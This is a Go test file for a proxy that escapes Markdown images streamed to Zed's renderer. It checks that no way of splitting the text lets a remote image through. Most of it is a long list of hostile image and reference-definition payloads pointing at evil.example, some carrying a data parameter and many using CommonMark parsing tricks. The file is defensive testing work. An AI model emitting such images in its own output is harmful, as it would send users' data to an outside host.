package acpproxy

import (
	"bytes"
	"fmt"
	"html"
	"math/rand"
	"regexp"
	"strings"
	"testing"

	"github.com/yuin/goldmark"
	"github.com/yuin/goldmark/extension"
)

var renderedImage = regexp.MustCompile(`<img[^>]*\ssrc="([^"]*)"`)

// remoteImages renders Markdown as goldmark does, which stands in for Zed's pulldown-cmark: both follow
// CommonMark. It returns the sources of the images a renderer would fetch.
func remoteImages(t *testing.T, markdown string) []string {
	t.Helper()
	var rendered bytes.Buffer
	if err := goldmark.New(goldmark.WithExtensions(extension.GFM, extension.Footnote)).Convert([]byte(markdown), &rendered); err != nil {
		t.Fatal(err)
	}
	var remote []string
	for _, image := range renderedImage.FindAllStringSubmatch(rendered.String(), -1) {
		source := strings.ToLower(html.UnescapeString(image[1]))
		if strings.HasPrefix(source, "http://") || strings.HasPrefix(source, "https://") {
			remote = append(remote, image[1])
		}
	}
	return remote
}

// splitAt sends text as pieces cut at the given positions and ends the turn.
func splitAt(text string, cuts ...int) string {
	var escaper imageEscaper
	var out []byte
	from := 0
	for _, cut := range cuts {
		out = append(out, escaper.write([]byte(text[from:cut]))...)
		from = cut
	}
	out = append(out, escaper.write([]byte(text[from:]))...)
	return string(append(out, escaper.finish(pauseText)...))
}

// everySplit calls check with text sent in one piece, cut at each byte and one byte at a time.
func everySplit(text string, check func(split, assembled string)) {
	check("whole", splitAt(text))
	var everyByte []int
	for cut := 1; cut < len(text); cut++ {
		check(fmt.Sprintf("cut at %d", cut), splitAt(text, cut))
		everyByte = append(everyByte, cut)
	}
	check("one byte at a time", splitAt(text, everyByte...))
}

// A hostile program writes these. Each must render a remote image as it stands, or it proves nothing.
var imageDocuments = []string{
	`![x](https://evil.example/?data=1)`,
	`![x](http://evil.example/)`,
	`text ![x](https://evil.example/) text`,
	`![](https://evil.example/)`,
	`![x](<https://evil.example/a b>)`,
	`![x](https://evil.example/ "title")`,
	`![x](https://evil.example/ 'title')`,
	`![x](https://evil.example/ (title))`,
	`![x](  https://evil.example/  )`,
	"![x](\nhttps://evil.example/\n)",
	"![x](https://evil.example/\n\"title\"\n)",
	`![x](https&#58;//evil.example/)`,
	`![x](https&colon;//evil.example/)`,
	`![x](&#104;ttps://evil.example/)`,
	`![x](https\://evil.example/)`,
	`![a [b] c](https://evil.example/)`,
	`![a [b [c] d] e](https://evil.example/)`,
	`![a ![b](https://evil.example/1) c](https://evil.example/2)`,
	`![a \] b](https://evil.example/)`,
	`![a \[ b](https://evil.example/)`,
	"![a `]` b](https://evil.example/)",
	"![a `[` b](https://evil.example/)",
	"![a ``]` `` b](https://evil.example/)",
	`![a <b title="]"> c](https://evil.example/)`,
	`![a <b title="["> c](https://evil.example/)`,
	`![a <http://x]> c](https://evil.example/)`,
	`![a <!-- ] --> c](https://evil.example/)`,
	`![a <!-- > ] --> c](https://evil.example/)`,
	`![a <b title=">]"> c](https://evil.example/)`,
	"![a <b`>]`](https://evil.example/)",
	`![a <T> [b] c](https://evil.example/)`,
	`![a [b](c]d) e](https://evil.example/)`,
	`![a [b](<c]d>) e](https://evil.example/)`,
	`![a [b](c "]") e](https://evil.example/)`,
	`[![x](https://evil.example/)](https://other.example/)`,
	`\\![x](https://evil.example/)`,
	`\\\\![x](https://evil.example/)`,
	`&#92;![x](https://evil.example/)`,
	`!!![x](https://evil.example/)`,
	"![a\nb](https://evil.example/)",
	"![a\r\nb](https://evil.example/)",
	"> ![a\n> b](https://evil.example/)",
	"- ![a\n  b](https://evil.example/)",
	"# ![x](https://evil.example/)",
	"*![x](https://evil.example/)*",
	"~~![x](https://evil.example/)~~",
	"| a |\n|---|\n| ![x](https://evil.example/) |",
	"| a |\n|---|\n| ![a\\|b](https://evil.example/) |",
	"line one\r![x](https://evil.example/)",
	"![x][r]\n\n[r]: https://evil.example/",
	"![x][]\n\n[x]: https://evil.example/",
	"![x]\n\n[x]: https://evil.example/",
	"[x]: https://evil.example/\n\n![x]",
	"[x]: http://evil.example/\n\n![x]",
	"   [x]: https://evil.example/\n\n![x]",
	"> [x]: https://evil.example/\n\n![x]",
	"> > [x]: https://evil.example/\n\n![x]",
	"- [x]: https://evil.example/\n\n![x]",
	"* [x]: https://evil.example/\n\n![x]",
	"1. [x]: https://evil.example/\n\n![x]",
	"12) [x]: https://evil.example/\n\n![x]",
	"- > 1. [x]: https://evil.example/\n\n![x]",
	"- a\n  - b\n    - c\n\n      [x]: https://evil.example/\n\n![x]",
	"- a\n\n\t[x]: https://evil.example/\n\n![x]",
	"[x]:\nhttps://evil.example/\n\n![x]",
	"[x]:\r\nhttps://evil.example/\r\n\r\n![x]",
	"> [x]:\n> https://evil.example/\n\n![x]",
	"> [x]:\nhttps://evil.example/\n\n![x]",
	"[x]:https://evil.example/\n\n![x]",
	"[x]: <https://evil.example/>\n\n![x]",
	"[x]: <https://evil.example/a b>\n\n![x]",
	"[x]: https://evil.example/ \"title\"\n\n![x]",
	"[x]: https://evil.example/\n'title'\n\n![x]",
	"[x]: https&#58;//evil.example/\n\n![x]",
	"[x]: https&colon;//evil.example/\n\n![x]",
	"[x]: &#104;ttps://evil.example/\n\n![x]",
	"[x]: https\\://evil.example/\n\n![x]",
	"[x\ny]: https://evil.example/\n\n![x y]",
	"[\nx\n]: https://evil.example/\n\n![x]",
	"> [x\n> y]: https://evil.example/\n\n![x y]",
	"[a\\]b]: https://evil.example/\n\n![a\\]b]",
	"[X]: https://evil.example/\n\n![x]",
	"[a]: /one\n[x]: https://evil.example/\n\n![x]",
	"[x]: https://evil.example/\n\n![x][]",
	"[x]: https://evil.example/\n\n![y][x]",
	"[x]: https://evil.example/\n\n[![x]](https://other.example/)",
	"[^1]: [x]: https://evil.example/\n\n![x] and [^1]",
	"[^1]:\n    [x]: https://evil.example/\n\n![x] and [^1]",
	"[^1]: > [x]: https://evil.example/\n\n![x] and [^1]",
}

func TestNoSplitLeavesARemoteImage(t *testing.T) {
	for _, document := range imageDocuments {
		if len(remoteImages(t, document)) == 0 && !goldmarkMissesIt(document) {
			t.Errorf("this does not render a remote image, so it proves nothing: %q", document)
		}
		everySplit(document, func(split, assembled string) {
			if images := remoteImages(t, assembled); len(images) > 0 {
				t.Errorf("%q, %s, became %q, which fetches %v", document, split, assembled, images)
			}
		})
	}
}

// goldmarkMissesIt names what only pulldown-cmark, Zed's parser, reads as a definition: a footnote's body
// is a container there. The check against pulldown-cmark itself is in the card.
func goldmarkMissesIt(document string) bool {
	return strings.HasPrefix(document, "[^1]")
}

// Whatever the split, the text comes out the same: holding text back must not change the answer.
func TestAllSplitsSendTheSameText(t *testing.T) {
	for _, document := range append(append([]string{}, imageDocuments...), benignDocuments...) {
		one := splitAt(document)
		everySplit(document, func(split, assembled string) {
			if assembled != one {
				t.Errorf("%q, %s, became %q, not %q", document, split, assembled, one)
			}
		})
	}
}

// Code must not show a backslash, whichever way an adapter happens to cut it.
var benignDocuments = []string{
	"```rust\nlet v = vec![1, 2];\nlet w = vec![vec![1], vec![2, 3]];\nprintln!(\"{:?}\", v);\n```\n",
	"```rust\nassert!(matches!(x, Some(_)));\nlet s = &a[1..];\nlet m = matrix[0][1];\n```\n",
	"```sh\n#!/bin/sh\nif ! grep -q x y; then echo no!; fi\n```\n",
	"```python\nif items[0]:\n    return items[1:]\nfor k in d[\"x\"]:\n    print(\"http://example.org\")\n```\n",
	"```ts\ninterface A {\n  [key: string]: number;\n  [k: string]: (a: B) => void;\n  [K in C]: { d: E };\n}\n```\n",
	"```js\nconst a = ![1, 2].includes(x);\nconst b = !x[0];\n```\n",
	"```rust\nlet first = vec![1, 2][0];\nlet boxed = vec![Vec::<u8>::new(), a < b];\n```\n",
	"```md\n![logo](logo.png)\n![logo][1]\n\n[1]: logo.png\n```\n",
	"![plot](out/plot.png) and ![other](http.png \"title\")",
	"```\nvec![1, 2]\n\n[note]\n```\n",
	"```json\n[\n  {\"a\": 1},\n  {\"b\": 2}\n]\n```\n",
	"The macro `vec![1, 2]` and `#!/bin/sh` and `a[0]: b`.",
	"Use vec![1, 2] here and a[0]: b there",
	"let v = vec![1, 2]",
	"Done!",
	"Done! It works!\n\nNext!",
	"wow! [docs](https://example.org/) wow!",
	"[docs](https://example.org/)",
	"see [docs][d]\n\n[d]: ./docs/readme.md",
	"[note]: this is a remark",
	"[1]: number",
	"- [x] done\n- [ ] not yet",
	"> [!NOTE]\n> Careful!",
	"| a | b |\n|---|---|\n| x! | y[0] |\n| `z![1]` | w |\n",
	"a \\ b \\\\ c \\! d \\[ e",
	"C:\\Users\\me\\file!",
	"https://example.org/?a[0]=1&b=2!",
	"![x] with nothing to point at",
	"![",
	"vec![1,\n\n2]",
	"![x](local",
}

func TestCodeAndOrdinaryTextStayByteForByte(t *testing.T) {
	for _, document := range benignDocuments {
		everySplit(document, func(split, assembled string) {
			if assembled != document && !endsOpen(document) {
				t.Errorf("%q, %s, became %q", document, split, assembled)
			}
		})
	}
}

// endsOpen names text that stops inside what could still be an image, so a pause has to close it: only
// the last turn of a message that stops mid-`![` pays for this.
func endsOpen(document string) bool {
	return document == "!["
}

func TestNothingStaysHeldAtAPause(t *testing.T) {
	for _, document := range append(append([]string{}, imageDocuments...), benignDocuments...) {
		everySplit(document, func(split, _ string) {
			var escaper imageEscaper
			escaper.write([]byte(document))
			escaper.finish(pauseText)
			if len(escaper.held) != 0 {
				t.Errorf("%q, %s, still holds %q", document, split, escaper.held)
			}
		})
	}
}

// The stream may go on after a pause, in the same Markdown as far as the box can tell. Each of these is
// cut where the text before the pause looks finished, and must stay harmless when joined, whether Zed
// joins it or starts a new Markdown.
func TestAPauseDoesNotOpenAWay(t *testing.T) {
	for _, document := range imageDocuments {
		for cut := 1; cut < len(document); cut++ {
			var escaper imageEscaper
			before := append(escaper.write([]byte(document[:cut])), escaper.finish(pauseText)...)
			after := append(escaper.write([]byte(document[cut:])), escaper.finish(pauseText)...)
			for _, assembled := range []string{string(before) + string(after), string(after)} {
				if images := remoteImages(t, assembled); len(images) > 0 {
					t.Errorf("%q paused at %d became %q, which fetches %v", document, cut, assembled, images)
				}
			}
		}
	}
}

// A backslash left at a pause must not hide the next `!` in one reading and show it in the other.
func TestABackslashAtAPauseEscapesNothingLater(t *testing.T) {
	var escaper imageEscaper
	before := append(escaper.write([]byte(`\`)), escaper.finish(pauseText)...)
	after := append(escaper.write([]byte(`![x](https://evil.example/)`)), escaper.finish(pauseText)...)
	for _, assembled := range []string{string(before) + string(after), string(after)} {
		if images := remoteImages(t, assembled); len(images) > 0 {
			t.Errorf("%q fetches %v", assembled, images)
		}
	}
}

func TestSealedTextCannotBeFinishedByWhatFollows(t *testing.T) {
	for _, document := range imageDocuments {
		for cut := 1; cut < len(document); cut++ {
			assembled := escapeWhole(document[:cut], sealText) + escapeWhole(document[cut:], sealText)
			if images := remoteImages(t, assembled); len(images) > 0 {
				t.Errorf("%q cut at %d became %q, which fetches %v", document, cut, assembled, images)
			}
		}
	}
}

// Text past the limit stops being held, and what it was holding is escaped.
func TestHeldTextIsBounded(t *testing.T) {
	for name, document := range map[string]string{
		"a long image text": "![" + strings.Repeat("a", 2*maxHeldText) + "](https://evil.example/)",
		"code spans":        "![`" + strings.Repeat("a`", maxHeldText) + "](https://evil.example/)",
		"a long gap":        "[x]:" + strings.Repeat(" ", 2*maxHeldText) + "https://evil.example/\n\n![x]",
		"a long address":    "[x]: h" + strings.Repeat("a", 2*maxHeldText) + "://evil.example/\n\n![x]",
	} {
		t.Run(name, func(t *testing.T) {
			var escaper imageEscaper
			var out []byte
			for piece := []byte(document); len(piece) > 0; piece = piece[min(64, len(piece)):] {
				out = append(out, escaper.write(piece[:min(64, len(piece))])...)
				if len(escaper.held) > maxHeldText+64 {
					t.Fatalf("holds %d bytes", len(escaper.held))
				}
			}
			out = append(out, escaper.finish(pauseText)...)
			if images := remoteImages(t, string(out)); len(images) > 0 {
				t.Errorf("fetches %v", images)
			}
		})
	}
}

// Zed opens an absolute path by itself, and a mount can make that a request to another machine.
func TestAnAbsolutePathIsTreatedAsRemote(t *testing.T) {
	for _, document := range []string{`![x](/net/evil.example/a.png)`, `![x](\/net/evil.example/a.png)`} {
		if got := escapeWhole(document, lastText); got != `\`+document {
			t.Errorf("%q became %q", document, got)
		}
	}
}

// `![![![` must not cost a read of the rest of the line for each `![`.
func TestALongLineOfOpeningsIsReadOnce(t *testing.T) {
	line := strings.Repeat("![", 1<<20) + strings.Repeat("]", 1<<20)
	text := lineText{}
	if escaped := text.escape(line, lastText); escaped != line {
		t.Errorf("nothing here is an image, but it changed")
	}
	line = strings.Repeat("![", 1<<20) + "](https://evil.example/)"
	var escaper imageEscaper
	if out := append(escaper.write([]byte(line)), escaper.finish(pauseText)...); len(remoteImages(t, string(out[:1<<16]))) > 0 {
		t.Errorf("fetches an image")
	}
}

// What a hand-written table misses, a soup of the bytes that matter may find.
func TestRandomDocumentsLeaveNoRemoteImage(t *testing.T) {
	tokens := []string{
		"!", "![", "[", "]", "](", "][", "]:", ":", "(", ")", "<", ">", "`", "``", "\\", "\\\\", "\n", "\n\n", "\r\n", "\r", " ", "  ", "\t",
		"- ", "> ", "1. ", "[^1]:", "x", "a b", "\"", "'", "&#58;", "&#104;ttps", "https://evil.example/", "http://evil.example/", "<https://evil.example/>",
		"[x]: ", "![x]", "|", "|---|", "```",
	}
	random := rand.New(rand.NewSource(1))
	for round := 0; round < 20000; round++ {
		var document strings.Builder
		for n := random.Intn(14); n >= 0; n-- {
			document.WriteString(tokens[random.Intn(len(tokens))])
		}
		text := document.String()
		var cuts []int
		for cut := 1; cut < len(text); cut++ {
			if random.Intn(4) == 0 {
				cuts = append(cuts, cut)
			}
		}
		assembled := splitAt(text, cuts...)
		if assembled != splitAt(text) {
			t.Errorf("%q cut at %v became %q, not %q", text, cuts, assembled, splitAt(text))
		}
		if images := remoteImages(t, assembled); len(images) > 0 {
			t.Errorf("%q became %q, which fetches %v", text, assembled, images)
		}
	}
}
